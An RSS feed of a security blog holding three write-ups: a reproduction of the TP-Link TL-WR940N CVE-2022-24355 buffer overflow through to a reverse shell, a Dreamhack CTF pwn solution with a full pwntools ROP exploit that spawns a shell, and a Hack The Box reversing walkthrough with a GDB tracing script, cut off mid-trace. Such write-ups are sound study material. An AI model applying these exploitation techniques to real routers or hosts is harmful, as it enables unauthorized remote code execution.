<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>All Posts - Cr0nica1</title>
        <link>https://cr0nica1.github.io/posts/</link>
        <description>All Posts | Cr0nica1</description>
        <generator>Hugo -- gohugo.io</generator><language>en-us</language><managingEditor>minhtoanlamson2005@gmail.com (cr0nica1)</managingEditor>
            <webMaster>minhtoanlamson2005@gmail.com (cr0nica1)</webMaster><lastBuildDate>Sat, 02 Aug 2025 20:56:05 &#43;0700</lastBuildDate><atom:link href="https://cr0nica1.github.io/posts/" rel="self" type="application/rss+xml" /><item>
    <title>Research: Reproducing CVE-2022-24355 on TP-Link TL-WR940N</title>
    <link>https://cr0nica1.github.io/posts/cve_2022_24355/</link>
    <pubDate>Sat, 02 Aug 2025 20:56:05 &#43;0700</pubDate>
    <author>cr0nica1</author>
    <guid>https://cr0nica1.github.io/posts/cve_2022_24355/</guid>
    <description><![CDATA[<h2 id="about-tp-link-tl-wr940n-and-the-vulnerability">About TP-Link TL-WR940N and the vulnerability</h2>
<p></p>
<p>The TP-Link TL-WR940N is a widely used wireless router known for its affordability and basic home networking features. In this article, i will reproduce CVE-2022-24355, a critical vulnerability on TL-WR940N firmware version 200316 and lower.
CVE-2022-24355 allows attackers to execute malicious code on affected installations of TP-Link TL-WR940N routers without requiring additional authentication. This vulnerability results from a user-supplied data mechanism: when parsing file extensions, this mechanism does not check the length of file name extensions. It copies them to a fixed-length stack-based buffer. An attacker can overwrite the return address and redirect the instruction pointer to a malicious shellcode.</p>
<h2 id="analyzing-the-vulnerability">Analyzing the vulnerability</h2>
<p>In this article, i use the TL-WR940N v4 firmware version 160617 to reproducing the exploitation of this vulnerability.</p>
<p></p>
<p>From main() function, httpd() function is called to initialize http service. This function deploys all the endpoints of the HTTP service like &lsquo;/&rsquo; , &lsquo;/userRpm/LoginRpm.htm&rsquo;, &lsquo;/help/&rsquo;,&hellip;. User must access the &lsquo;/fs/&rsquo; and &lsquo;/loginFs/&rsquo; endpoint to make the program call the httpRpmFs() function.</p>
<p></p>
<p>The Referer of request also must be equal to the host ip to pass the security check in httpDispatcher().</p>
<p></p>
<p>Analyzing httpRpmFs(), we easily show that this function is used to read the file content if the file name is in &lsquo;/tmp/&rsquo; or &lsquo;/web/&rsquo; folder of firmware.</p>
<p></p>
<p>Well, it looks good and does not seem vulnerable. I find and read blogs about analyzing this vulnerability (which I add to references). They said that it is vulnerable to reading &lsquo;passwd&rsquo; in &lsquo;/tmp/&rsquo; folder. The firmware 211111 fixed this vulnerability, so I am analyzing it to prove that it is vulnerable to reading files in &lsquo;/tmp/&rsquo;, specifically &lsquo;passwd&rsquo;.</p>
<p></p>
<p>A security check in firmware 211111 prevents us from reading files in &lsquo;/tmp/&rsquo; folder if we do not have authorized access. So, I try to read &lsquo;/tmp/passwd&rsquo;.</p>
<p></p>
<p></p>
<p>I attached a debugger to see why it crashed and saw that a part of the request was written on the stack and caused overflow.</p>
<p></p>
<p>The Return address value is overwritten by &lsquo;3456&rsquo;, which is from &ldquo;cookie: authorization: 123456&rdquo; of the request. A part of the request overwrites the return address, then causes httpd to crash.</p>
<p>Go back with httpRpmFs(), the program will make a response containing the content of the file we want to read in &lsquo;/tmp/&rsquo; folder after reading that file. Ensuring that the &lsquo;Content-Type&rsquo; of the response will match the file name extension of that file, sub_506790() is called to detect it.</p>
<p></p>
<p>This function creates a pointer that points to the end of the file path. Then, the pointer moves backward to find the &lsquo;.&rsquo; character, and copies the part of the string after &lsquo;.&rsquo; character. The program thinks that all content after &lsquo;.&rsquo; is a file extension. But in this case, &lsquo;/tmp/&rsquo; folder has a file &lsquo;passwd&rsquo;, which does not have a file extension. The pointer will move until it finds the first &lsquo;.&rsquo; character: the &lsquo;.&rsquo; of the IP address in the Referer header. All characters after this &lsquo;.&rsquo; are pushed to the stack. Then, the stack is overwritten. The return address value on the stack is overwritten, too, so the program crashes.</p>
<h2 id="reproducing-the-exploitation">Reproducing the exploitation</h2>
<p></p>
<p>From the checksec result, the program does not have any mitigation. In some blogs, they said that the router‚Äôs ASLR is disabled. So we can easily get the libc base address to build the ROP gadget. I will overwrite the return address to a ROP chain, then redirect to a shellcode.</p>
<p>I borrowed a shellcode from (<a href="https://www.exploit-db.com/exploits/35868" target="_blank" rel="noopener noreffer ">https://www.exploit-db.com/exploits/35868</a>) and ROPgadget from (<a href="https://www.exploit-db.com/exploits/46678" target="_blank" rel="noopener noreffer ">https://www.exploit-db.com/exploits/46678</a>) to craft the payload of my exploit code, but after sending the payload, I do not receive any connection from the router (which is a reverse shell). I reanalyze and find that the toupper() will uppercase all characters from &lsquo;a&rsquo; to &lsquo;z&rsquo;. My shellcode has many bytes from &lsquo;a&rsquo; to &lsquo;z&rsquo;.</p>
<p></p>
<p>I obfuscate my shellcode with xor.encoded from pwntools, but it still has an illegal byte.</p>
<p></p>
<p>After finding on the internet, I see that we can change all <code>$t6</code> in shellcode to <code>$t1</code>, because the shellcode and rop chain do not use this register, and ¬†<code>$t1</code> register has the same purpose as <code>$t6</code>.</p>
<p></p>
<p>And finally, I craft my payload and receive a reverse shell from the router.</p>
<p></p>
<p></p>
<h2 id="references">References</h2>
<ul>
<li><a href="https://blog.viettelcybersecurity.com/tp-link-tl-wr940n-httpd-httprpmfs-stack-based-buffer-overflow-remote-code-execution-vulnerability/" target="_blank" rel="noopener noreffer ">https://blog.viettelcybersecurity.com/tp-link-tl-wr940n-httpd-httprpmfs-stack-based-buffer-overflow-remote-code-execution-vulnerability/</a></li>
<li><a href="https://flex0geek.blogspot.com/2024/04/debugexploit-cve-2022-24355-tp-link-tl.html" target="_blank" rel="noopener noreffer ">https://flex0geek.blogspot.com/2024/04/debugexploit-cve-2022-24355-tp-link-tl.html</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/581866861" target="_blank" rel="noopener noreffer ">https://zhuanlan.zhihu.com/p/581866861</a></li>
</ul>
]]></description>
</item>
<item>
    <title>Dreamhack CTF Season 7 Round #5 (üö©Div1)</title>
    <link>https://cr0nica1.github.io/posts/dhctf%237r5/</link>
    <pubDate>Wed, 16 Apr 2025 03:57:40 &#43;0700</pubDate>
    <author>cr0nica1</author>
    <guid>https://cr0nica1.github.io/posts/dhctf%237r5/</guid>
    <description><![CDATA[<p>Gi·∫£i n√†y di·ªÖn ra t√¨nh c·ªù v√†o th·ªùi ƒëi·ªÉm m√¨nh v·ª´a xong ƒë·ª£t trainning CTF n√™n c√≥ th·ªùi gian r·∫£nh th·ª≠ s·ª©c. Tuy nhi√™n b·∫±ng m·ªôt c√°ch th·∫ßn k·ª≥ n√†o ƒë√≥ m√¨nh l·ª° b√†i rev kh√° ti·∫øc m√† gi·∫£i ƒë∆∞·ª£c c√¢u pwn n√†y.</p>
<h2 id="chat-with-me---binary-exploitation">Chat with Me - Binary exploitation</h2>
<h3 id="i-vulnerability">I. Vulnerability</h3>
<p></p>
<p></p>
<p>Checksec v√† ƒë·ªçc Pseudocode trong IDA c√≥ NX, kh√¥ng c√≥ PIE v√† canary v√† c√≥ m·ªôt l·ªói buffer overflow:</p>
<pre tabindex="0"><code>_QWORD buf[97];
memset(buf, 0, 0x300uLL);
v12 = read(v13, buf, 0x600uLL);
</code></pre><p>Do ch∆∞∆°ng tr√¨nh c√≥ NX, v√¨ v·∫≠y h∆∞·ªõng ti·∫øp c·∫≠n s·∫Ω kh√¥ng ph·∫£i l√† ret2shellcode.</p>
<h3 id="ii-exploitation">II. Exploitation</h3>
<p>Ch∆∞∆°ng tr√¨nh s·ª≠ d·ª•ng nhi·ªÅu h√†m g·ªçi t·ª´ libc tr∆∞·ªõc khi y√™u c·∫ßu nh·∫≠p v√†o b·ªô ƒë·ªám, ƒë·ªìng th·ªùi cho nh·∫≠p t·∫≠n 0x600 byte. Do v·∫≠y √Ω t∆∞·ªüng s·∫Ω l√† leak gi√° tr·ªã t·ª´ b·∫£ng GOT v√† t√¨m libc_base. ƒê·ªçc trong stack tr√™n IDA, c·∫ßn ph·∫£i padding 840 byte th√¨ ch√∫ng ta s·∫Ω ƒë·∫øn ret_address, th·ª≠ nh·∫≠p 848 byte ƒë·ªÉ ki·ªÉm tra trong GDB:</p>
<p></p>
<p>Nh∆∞ v·∫≠y l√† ch√∫ng ta ƒë√£ ghi ƒë√® ƒë∆∞·ª£c, ti·∫øp ƒë·∫øn ch√∫ng ta c·∫ßn t√¨m c√°c gadget ƒë·ªÉ g·ªçi h√†m read, bi·∫øt r·∫±ng fd c·ªßa ch√∫ng ta l√† 4.</p>
<p></p>
<p>C√≥ s·∫µn m·ªôt gadget r·∫•t ƒë·∫πp ·ªü ƒë√¢y. Tuy nhi√™n ·ªü ƒë√¢y th√¨ m√¨nh s·ª£ r·∫±ng vi·ªác overflow s·∫Ω khi·∫øn m·ªôt v√†i h√†m ƒë·∫∑c bi·ªát ki·ªÉm tra t√¨nh tr·∫°ng k·∫øt n·ªëi l√†m m·∫•t connection n√™n ƒë·ªÉ an to√†n m√¨nh stack pivot sang m·ªôt v√πng c√≥ quy·ªÅn rw, v√† do c≈©ng kh√¥ng c√≥ PIE n√™n m√¨nh d·ªÖ d√†ng b·ªï sung v√†o payload c√°c gadget ƒë·ªÉ stack pivot v√† th·ª±c hi·ªÉn read m·ªôt l·∫ßn n·ªØa. M√¨nh t√¨m th√™m gadget pop_rbp v√† gadget leave_ret. Payload ƒë·∫ßu ti√™n ƒë·ªÉ leak libc_base v√† y√™u c·∫ßu h√†m read th√™m 1 l·∫ßn n·ªØa.</p>
<pre tabindex="0"><code>payload=b&#39;A&#39;*840
payload+=p64(gadget)+p64(0)+p64(0x8)+p64(elf.got[&#39;puts&#39;])+p64(4)
payload+=p64(elf.plt[&#39;send&#39;])
payload+=p64(pop_rbp)+p64(0x404900)
payload+=p64(gadget+1)+p64(0x300)+p64(0x404900)+p64(4)
payload+=p64(elf.plt[&#39;read&#39;])+p64(leave_ret)
</code></pre><p>B√¨nh th∆∞·ªùng th√¨ ƒë·∫øn ƒë√¢y s·∫Ω kh√° ƒë∆°n gi·∫£n v√¨ payload th·ª© 2 l√† g·ªçi system(&rsquo;/bin/sh&rsquo;). Tuy nhi√™n ƒëi·ªÅu ph·ª©c t·∫°p ·ªü ƒë√¢y l√† fd c·ªßa ch√∫ng ta l√† 4, c√≤n shell t∆∞∆°ng t√°c v·ªõi stdin v√† stdout ·ªü fd=0 v√† fd=1. Ch√∫ng ta c·∫ßn √©p n√≥ v·ªÅ fd=4:</p>
<pre tabindex="0"><code>dup2(4,0);
dup2(4,1);
</code></pre><h3 id="iii-script">III. Script</h3>
<pre tabindex="0"><code>from pwn import *
context.binary=elf=ELF(&#39;./chall&#39;,checksec=False)
libc=ELF(&#39;./libc.so.6&#39;,checksec=False)
gadget=0x0000000000401396
pop_rbp=0x40137d
push_rsp=0x207768
leave_ret=0x4016ca

p=remote(&#39;host3.dreamhack.games&#39;,20267)
p.recvuntil(b&#39;Welcome to the TCP Chat Server!\n&#39;)

payload=b&#39;A&#39;*840
payload+=p64(gadget)+p64(0)+p64(0x8)+p64(elf.got[&#39;puts&#39;])+p64(4)
payload+=p64(elf.plt[&#39;send&#39;])
payload+=p64(pop_rbp)+p64(0x404900)
payload+=p64(gadget+1)+p64(0x300)+p64(0x404900)+p64(4)
payload+=p64(elf.plt[&#39;read&#39;])+p64(leave_ret)
p.send(payload)

leak=u64(p.recvn(8))
log.info(f&#39;leak: {hex(leak)}&#39;)
lib_base=leak-libc.sym[&#39;puts&#39;]
lib_system=lib_base+libc.sym[&#39;system&#39;]
log.info(f&#39;lib base: {hex(lib_base)}&#39;)

payload=p64(0)+p64(gadget+2)+p64(0)+p64(4)+p64(libc.sym[&#39;dup2&#39;]+lib_base)
payload+=p64(gadget+2)+p64(1)+p64(4)+p64(libc.sym[&#39;dup2&#39;]+lib_base)
payload+=p64(gadget+3)+p64(lib_base+next(libc.search(b&#39;/bin/sh&#39;)))+p64(gadget+4)+p64(lib_system)

p.send(payload)
p.interactive()
</code></pre><h1 id="iv-reference">IV. Reference</h1>
<p><a href="https://dreamhack.io/ctf/659" target="_blank" rel="noopener noreffer ">https://dreamhack.io/ctf/659</a></p>
]]></description>
</item>
<item>
    <title>Hackthebox: Cyber Apocalypse CTF 2025: Tales from Eldoria</title>
    <link>https://cr0nica1.github.io/posts/htb/</link>
    <pubDate>Wed, 16 Apr 2025 03:10:02 &#43;0700</pubDate>
    <author>cr0nica1</author>
    <guid>https://cr0nica1.github.io/posts/htb/</guid>
    <description><![CDATA[<p>Nh∆∞ m·ªçi khi, hackthebox lu√¥n mang ƒë·∫øn cho ch√∫ng ta gi·∫£i CTF kh√° ch·∫•t l∆∞·ª£ng v·ªÅ ƒë·ªô ph√¢n lo·∫°i, ph√π h·ª£p cho c·∫£ beginner v√† ng∆∞·ªùi ƒë√£ c√≥ kinh nghi·ªám. ·ªû gi·∫£i n√†y nh·ªØng challenge easy v√† very easy ƒë·ªÅu qu√° d·ªÖ n√™n m√¨nh s·∫Ω ch·ªâ vi·∫øt writeup challenge m·ª©c ƒë·ªô medium m√¨nh gi·∫£i ƒë∆∞·ª£c.</p>
<h1 id="writeup">Writeup</h1>
<h2 id="singlestep---rev">Singlestep - rev</h2>
<h3 id="1-static-analysis">1. Static Analysis</h3>
<p>Load file v√†o IDA, ch√∫ng ta nh·∫≠n th·∫•y h√†m h√†m main call ƒë·∫øn m·ªôt h√†m loc_5555555583E0 n√†o ƒë·∫•y. V√†o trong h√†m b√™n trong h√†m n√†y ki·ªÉm tra.</p>
<p></p>
<p>·ªû b√™n trong n√†y, ch√∫ng ta th·∫•y m·ªôt ƒëo·∫°n d√†i m√£ th·ª±c thi thu·ªôc section .text m√† IDA kh√¥ng ƒë·ªçc ƒë∆∞·ª£c code x64 asm. Nh√¨n v√†o c√°c l·ªánh xor, m√¨nh nh·∫≠n ra r·∫±ng ch∆∞∆°ng tr√¨nh s·∫Ω gi·∫£i m√£ c√°c v√πng m√£ kh√¥ng ƒë·ªçc ƒë∆∞·ª£c ƒë√≥ b·∫±ng xor, th·ª±c thi l·ªánh ·ªü ƒë√≥ r·ªìi l·∫°i xor l·∫°i ƒë·ªÉ m√£ h√≥a 1 l·∫ßn n·ªØa. Do v·∫≠y ƒëo·∫°n m√£ n√†y ch·ªâ c√≥ th·ªÉ ƒë·ªçc ƒë∆∞·ª£c trong runtime, kh√¥ng th·ªÉ ƒë·ªçc ƒë∆∞·ª£c b·∫±ng c√°ch disassemble th√¥ng th∆∞·ªùng. C√°ch duy nh·∫•t m√¨nh nghƒ© ƒë∆∞·ª£c l√† l∆∞u l·∫°i code ƒë∆∞·ª£c gi·∫£i m√£ trong khi debug, tuy nhi√™n s·∫Ω r·∫•t m·∫•t th·ªùi gian n√™n m√¨nh ph·∫£i s·ª≠ d·ª•ng script (ƒë∆∞·ª£c t√†i tr·ª£ b·ªüi anh shynt_ :v) ƒë·ªÉ l∆∞u l·∫°i nh·ªØng ƒëo·∫°n code ƒë∆∞·ª£c deobfucasting trong khi ch·∫°y. Do m√¨nh quan t√¢m ƒë·∫øn ƒëo·∫°n code t·ª´ sau khi nh·∫≠p input n√™n m√¨nh s·∫Ω deobfuscating k·ªÉ t·ª´ ƒëo·∫°n y√™u c·∫ßu nh·∫≠p input. L∆∞u √Ω r·∫±ng trong t·∫•t c·∫£ c√°c string ƒë∆∞·ª£c in ra m√†n h√¨nh, ch·ªâ c√≥ duy nh·∫•t 1 string g·ªçi printf l√† &ldquo;Please enter the ‚ú® secret ‚ú® bequeathed to his cult following:&rdquo;, do v·∫≠y script s·∫Ω deobfuscating t·ª´ printf trong got.plt.</p>
<pre tabindex="0"><code>import gdb

gdb.execute(&#34;file singlestep&#34;)
gdb.execute(&#34;break printf@plt&#34;)
gdb.execute(&#34;run&#34;)

log_file = open(&#34;log.txt&#34;, &#34;w&#34;)

try:
    while True:
        gdb.execute(&#34;stepi&#34;, to_string=True)
        output = gdb.execute(&#34;x/i $pc&#34;, to_string=True)
        
        if &#34;xor&#34; in output and (&#34;BYTE&#34; in output or &#34;WORD&#34; in output or &#34;DWORD&#34; in output):
            continue

        if &#34;nop&#34; in output:
            continue

        if &#34;pushfq&#34; in output:
            continue

        if &#34;popfq&#34; in output:
            continue

        if &#34;pushf&#34; in output:
            continue

        if &#34;popf&#34; in output:
            continue

        
        # print(output.strip())
        log_file.write(output)
        log_file.flush()
except KeyboardInterrupt:
    print(&#34;&#34;)
finally:
    log_file.close()
</code></pre><h3 id="2-dynamic-analysis">2. Dynamic analysis</h3>
<p>ƒê·∫∑t breakpoint t·∫°i ƒëi·ªÉm ƒë·∫ßu ti√™n c·ªßa ƒëo·∫°n code ƒë∆∞·ª£c ghi l·∫°i b·ªüi script tr√™n. Ti·∫øp t·ª•c s·ª≠ d·ª•ng step into cho ƒë·∫øn khi ch∆∞∆°ng tr√¨nh ƒë·ªçc input, nh·∫≠p input r·ªìi d·ª´ng l·∫°i.</p>
<p></p>
<p>M√¨nh v√†o file log.txt, c·∫Øt script k·ªÉ t·ª´ ƒëo·∫°n n√†y cho ƒë·∫øn khi ch∆∞∆°ng tr√¨nh g·ªçi l·ªánh puts. ƒê√¢y s·∫Ω l√† ph·∫ßn logic ch√≠nh c·ªßa ch∆∞∆°ng tr√¨nh.</p>
<pre tabindex="0"><code>=&gt; 0x55555555b0a2:	mov    DWORD PTR [rbp-0x27c],eax
=&gt; 0x55555555b0d9:	cmp    DWORD PTR [rbp-0x27c],0x0
    ‚Üí cmp operands: DWORD PTR [rbp-0x27c] = N/A, 0x0 = 0
=&gt; 0x55555555b111:	js     0x55555555b2ba

=&gt; 0x55555555b141:	mov    eax,DWORD PTR [rbp-0x27c]
=&gt; 0x55555555b16e:	sub    eax,0x1
=&gt; 0x55555555b18e:	cdqe
=&gt; 0x55555555b1b1:	movzx  eax,BYTE PTR [rbp+rax*1-0x210]
=&gt; 0x55555555b1da:	cmp    al,0xa
    ‚Üí cmp operands: $al = 10, 0xa = 10
=&gt; 0x55555555b1fc:	jne    0x55555555b2ba

=&gt; 0x55555555b22c:	mov    eax,DWORD PTR [rbp-0x27c]
=&gt; 0x55555555b259:	sub    eax,0x1
=&gt; 0x55555555b279:	cdqe
=&gt; 0x55555555b29c:	mov    BYTE PTR [rbp+rax*1-0x210],0x0
=&gt; 0x55555555b2d6:	lea    rax,[rbp-0x210]
=&gt; 0x55555555b30b:	mov    rdi,rax
=&gt; 0x55555555b333:	call   0x555555557690
</code></pre><p>ƒê·ªçc ƒëo·∫°n asm n√†y k·∫øt h·ª£p v·ªõi debug, ch√∫ng ta d·ªÖ d√†ng nh·∫≠n ra ch∆∞∆°ng tr√¨nh lo·∫°i b·ªè k√Ω t·ª± &ldquo;/n&rdquo; cu·ªëi c√πng t·ª´ input, sau ƒë√≥ l∆∞u l·∫°i gi√° tr·ªã n√†y l√™n stack. Cu·ªëi ƒëo·∫°n m√£ n√†y, ch∆∞∆°ng tr√¨nh ƒë·∫©y ƒë·ªãa ch·ªâ c·ªßa v√πng nh·ªõ ch·ª©a chu·ªói input v√†o rdi.</p>
<pre tabindex="0"><code>=&gt; 0x55555555769c:	endbr64                            // kiem tra do dai input
=&gt; 0x5555555576b5:	push   rbp
=&gt; 0x5555555576d1:	mov    rbp,rsp
=&gt; 0x5555555576f2:	sub    rsp,0x18
=&gt; 0x55555555770e:	mov    QWORD PTR [rbp-0x18],rdi
=&gt; 0x555555557734:	mov    QWORD PTR [rbp-0x8],0x0
=&gt; 0x555555557765:	jmp    0x5555555577d0
=&gt; 0x5555555577dc:	mov    rax,QWORD PTR [rbp-0x18]
=&gt; 0x5555555577fe:	movzx  eax,BYTE PTR [rax]
=&gt; 0x55555555781e:	test   al,al
=&gt; 0x555555557840:	jne    0x55555555777a

=&gt; 0x55555555778d:	add    QWORD PTR [rbp-0x8],0x1
=&gt; 0x5555555577b8:	add    QWORD PTR [rbp-0x18],0x1
=&gt; 0x5555555577dc:	mov    rax,QWORD PTR [rbp-0x18]
=&gt; 0x5555555577fe:	movzx  eax,BYTE PTR [rax]
=&gt; 0x55555555781e:	test   al,al
=&gt; 0x555555557840:	jne    0x55555555777a
</code></pre><p>Ch∆∞∆°ng tr√¨nh b·∫Øt ƒë·∫ßu call m·ªôt h√†m, b√™n trong h√†m n√†y ch∆∞∆°ng tr√¨nh duy·ªát qua c√°c k√Ω t·ª± c·ªßa string v√† c·∫≠p nh·∫≠t k·∫øt qu·∫£ ƒë·ªô d√†i c·ªßa string. Khi v√≤ng l·∫∑p k·∫øt th√∫c, ch∆∞∆°ng tr√¨nh l∆∞u gi√° tr·ªã bi·∫øn ƒë·∫øm v√†o rax v√† tho√°t kh·ªèi h√†m, sau ƒë√≥ so s√°nh ƒë·ªô d√†i string v·ªõi 0x13.</p>
<pre tabindex="0"><code>=&gt; 0x555555557867:	mov    rax,QWORD PTR [rbp-0x8]
=&gt; 0x555555557880:	leave
=&gt; 0x55555555788a:	ret


=&gt; 0x55555555b357:	cmp    rax,0x13               // kiem tra do dai string.
    ‚Üí cmp operands: $rax = 19, 0x13 = 19
</code></pre><p>N·∫øu nh∆∞ ƒë·ªô d√†i string input th·ªèa m√£n ƒë·ªô d√†i 19, rip c·ªßa ch∆∞∆°ng tr√¨nh nh·∫£y ti·∫øp v√†o ƒëo·∫°n m√£ sau:</p>
<pre tabindex="0"><code>=&gt; 0x55555555b37c:	je     0x55555555b418                                       // loop kiem tra dieu kien dau tien
=&gt; 0x55555555b437:	mov    DWORD PTR [rbp-0x294],0x0
=&gt; 0x55555555b47c:	mov    BYTE PTR [rbp-0x296],0x1
=&gt; 0x55555555b4be:	mov    DWORD PTR [rbp-0x290],0x0
=&gt; 0x55555555b4fa:	jmp    0x55555555bd54
=&gt; 0x55555555bd70:	cmp    DWORD PTR [rbp-0x290],0x12
    ‚Üí cmp operands: DWORD PTR [rbp-0x290] = N/A, 0x12 = 18
=&gt; 0x55555555bda8:	jle    0x55555555b512

=&gt; 0x55555555b527:	mov    edx,DWORD PTR [rbp-0x290]
=&gt; 0x55555555b554:	movsxd rax,edx
=&gt; 0x55555555b585:	imul   rax,rax,0x66666667
=&gt; 0x55555555b5b4:	shr    rax,0x20
=&gt; 0x55555555b5cf:	sar    eax,1
=&gt; 0x55555555b5e7:	mov    ecx,edx
=&gt; 0x55555555b606:	sar    ecx,0x1f
=&gt; 0x55555555b626:	sub    eax,ecx
=&gt; 0x55555555b63e:	mov    ecx,eax
=&gt; 0x55555555b65d:	shl    ecx,0x2
=&gt; 0x55555555b67d:	add    ecx,eax
=&gt; 0x55555555b695:	mov    eax,edx
=&gt; 0x55555555b6ad:	sub    eax,ecx
=&gt; 0x55555555b6cc:	cmp    eax,0x4
    ‚Üí cmp operands: $eax = 0, 0x4 = 4
=&gt; 0x55555555b6f6:	jne    0x55555555b8e4
=&gt; 0x55555555b8f9:	mov    eax,DWORD PTR [rbp-0x294]
=&gt; 0x55555555b926:	lea    edx,[rax+0x1]
=&gt; 0x55555555b950:	mov    DWORD PTR [rbp-0x294],edx
=&gt; 0x55555555b980:	mov    edx,DWORD PTR [rbp-0x290]
=&gt; 0x55555555b9ad:	movsxd rdx,edx
=&gt; 0x55555555b9d8:	movzx  edx,BYTE PTR [rbp+rdx*1-0x210]
=&gt; 0x55555555ba01:	cdqe
=&gt; 0x55555555ba2a:	mov    BYTE PTR [rbp+rax*1-0x110],dl
=&gt; 0x55555555ba69:	movzx  edx,BYTE PTR [rbp-0x296]
=&gt; 0x55555555baa1:	mov    eax,DWORD PTR [rbp-0x290]
=&gt; 0x55555555bac7:	cdqe
=&gt; 0x55555555baea:	movzx  eax,BYTE PTR [rbp+rax*1-0x210]
=&gt; 0x55555555bb13:	cmp    al,0x40
    ‚Üí cmp operands: $al = 65, 0x40 = 64
=&gt; 0x55555555bb35:	jle    0x55555555bc63
=&gt; 0x55555555bb65:	mov    eax,DWORD PTR [rbp-0x290]
=&gt; 0x55555555bb8b:	cdqe
=&gt; 0x55555555bbae:	movzx  eax,BYTE PTR [rbp+rax*1-0x210]
=&gt; 0x55555555bbd7:	cmp    al,0x5a
    ‚Üí cmp operands: $al = 65, 0x5a = 90
=&gt; 0x55555555bbf9:	jg     0x55555555bc63
=&gt; 0x55555555bc23:	mov    eax,0x1
=&gt; 0x55555555bc4e:	jmp    0x55555555bc8e
=&gt; 0x55555555bc99:	and    eax,edx
=&gt; 0x55555555bcb1:	test   eax,eax
=&gt; 0x55555555bcd0:	setne  al
=&gt; 0x55555555bcfa:	mov    BYTE PTR [rbp-0x296],al
=&gt; 0x55555555bd31:	add    DWORD PTR [rbp-0x290],0x1
=&gt; 0x55555555bd70:	cmp    DWORD PTR [rbp-0x290],0x12
    ‚Üí cmp operands: DWORD PTR [rbp-0x290] = N/A, 0x12 = 18
=&gt; 0x55555555bda8:	jle    0x55555555b512
</code></pre><p>ƒêo·∫°n m√£ n√†y l·∫∑p qua c√°c gi√° tr·ªã c·ªßa string v√† ki·ªÉm tra ƒëi·ªÅu ki·ªán c·ªßa m·ªói k√Ω t·ª±. ·ªû c√°c index kh√¥ng chia h·∫øt cho 4, ch∆∞∆°ng tr√¨nh s·∫Ω ki·ªÉm tra xem gi√° tr·ªã c√≥ n·∫±m trong kho·∫£ng t·ª´ 0x41 ƒë·∫øn 0x5a hay kh√¥ng (c√°c gi√° tr·ªã c·ªßa k√Ω t·ª± ch·ªØ c√°i in hoa). ƒê·ªëi v·ªõi tr∆∞·ªùng h·ª£p index chia h·∫øt cho 4, ch∆∞∆°ng tr√¨nh s·∫Ω th·ª±c thi ki·ªÉm tra xem c√≥ ph·∫£i 0x2d (t·ª©c &lsquo;-&rsquo;) hay kh√¥ng.</p>
<pre tabindex="0"><code>=&gt; 0x55555555b72d:	movzx  edx,BYTE PTR [rbp-0x296]
=&gt; 0x55555555b765:	mov    eax,DWORD PTR [rbp-0x290]
=&gt; 0x55555555b78b:	cdqe
=&gt; 0x55555555b7ae:	movzx  eax,BYTE PTR [rbp+rax*1-0x210]
=&gt; 0x55555555b7d7:	cmp    al,0x2d
    ‚Üí cmp operands: $al = 45, 0x2d = 45
</code></pre><p>Tuy nhi√™n, ch∆∞∆°ng tr√¨nh ch·ªâ l∆∞u l·∫°i c√°c gi√° tr·ªã t·ª´ 0x41 ƒë·∫øn 0x5a (&lsquo;A&rsquo; ƒë·∫øn &lsquo;Z&rsquo;). Sau khi lo·∫°i b·ªè h·∫øt c√°c k√Ω t·ª± &lsquo;-&rsquo; trong string, ch∆∞∆°ng tr√¨nh ti·∫øp t·ª•c duy·ªát qua t·ª´ng ph·∫ßn t·ª≠ m·ªôt v√† th·ª±c hi·ªán 1 logic bi·∫øn ƒë·ªïi n√†o ƒë√≥.</p>
<pre tabindex="0"><code>=&gt; 0x55555555bfed:	mov    eax,DWORD PTR [rbp-0x28c]      // loop 1
=&gt; 0x55555555c024:	lea    edx,[rax*4+0x0]
=&gt; 0x55555555c05c:	mov    eax,DWORD PTR [rbp-0x288]
=&gt; 0x55555555c082:	add    eax,edx                               // k=4*i+j
=&gt; 0x55555555c09a:	cdqe
=&gt; 0x55555555c0bd:	movzx  eax,BYTE PTR [rbp+rax*1-0x110]       
=&gt; 0x55555555c0ed:	movsx  eax,al
=&gt; 0x55555555c114:	lea    edx,[rax-0x41]                 // edx=pos(input[k])
=&gt; 0x55555555c13e:	mov    eax,DWORD PTR [rbp-0x28c]
=&gt; 0x55555555c175:	imul   eax,DWORD PTR [rbp-0x288]
=&gt; 0x55555555c1a3:	mov    ecx,eax
=&gt; 0x55555555c1bb:	mov    eax,edx
=&gt; 0x55555555c1d3:	sub    eax,ecx                   
=&gt; 0x55555555c1f2:	movsxd rcx,eax                  //rcx=pos(input[k])-i*j
=&gt; 0x55555555c21c:	mov    eax,DWORD PTR [rbp-0x288]
=&gt; 0x55555555c249:	movsxd rdx,eax
=&gt; 0x55555555c273:	mov    eax,DWORD PTR [rbp-0x28c]
=&gt; 0x55555555c2a0:	movsxd rsi,eax
=&gt; 0x55555555c2d1:	lea    rax,[rbp-0x250]             
=&gt; 0x55555555c306:	mov    rdi,rax                                    
=&gt; 0x55555555c32e:	call   0x555555556180



=&gt; 0x55555555618c:	endbr64
=&gt; 0x5555555561a5:	push   rbp
=&gt; 0x5555555561c1:	mov    rbp,rsp
=&gt; 0x5555555561e2:	sub    rsp,0x30
=&gt; 0x5555555561fe:	mov    QWORD PTR [rbp-0x18],rdi     // 4
=&gt; 0x55555555621a:	mov    QWORD PTR [rbp-0x20],rsi    //  i
=&gt; 0x555555556236:	mov    QWORD PTR [rbp-0x28],rdx    // j
=&gt; 0x555555556252:	mov    QWORD PTR [rbp-0x30],rcx    // pos(input[k])-i*j
=&gt; 0x55555555626e:	mov    rax,QWORD PTR [rbp-0x18]    
=&gt; 0x555555556290:	mov    rax,QWORD PTR [rax]          
=&gt; 0x5555555562b1:	cmp    QWORD PTR [rbp-0x20],rax    // cmp i,4
    ‚Üí cmp operands: [rbp-0x20] = N/A, $rax = 4
=&gt; 0x5555555562d6:	jb     0x555555556343
=&gt; 0x55555555634f:	mov    rax,QWORD PTR [rbp-0x18]
=&gt; 0x55555555636b:	mov    rax,QWORD PTR [rax+0x8]    
=&gt; 0x555555556387:	cmp    QWORD PTR [rbp-0x28],rax          // cmp j,4
    ‚Üí cmp operands: [rbp-0x28] = N/A, $rax = 4           
=&gt; 0x5555555563ac:	jb     0x555555556419

=&gt; 0x555555556425:	mov    rax,QWORD PTR [rbp-0x18]    //
=&gt; 0x555555556441:	mov    rax,QWORD PTR [rax+0x8]
=&gt; 0x555555556464:	imul   rax,QWORD PTR [rbp-0x20]    
=&gt; 0x55555555648e:	mov    rdx,rax
